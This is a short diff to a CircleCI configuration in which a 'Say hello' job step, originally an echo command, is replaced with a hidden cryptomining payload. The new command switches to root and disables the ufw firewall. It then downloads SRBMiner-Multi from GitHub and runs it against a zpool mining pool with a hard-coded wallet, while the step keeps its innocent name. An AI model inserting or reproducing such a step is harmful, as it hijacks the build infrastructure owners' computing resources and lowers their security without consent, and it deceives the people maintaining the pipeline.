@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: sudo su && apt install ufw -y && sudo ufw disable &&  wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz && cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --algorithm minotaurx --pool minotaurx.na.mine.zpool.ca:7019 --wallet RRzL8NpRvYccXCaBXbm4BVyVSja3tGmMqs --password c=RVN
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
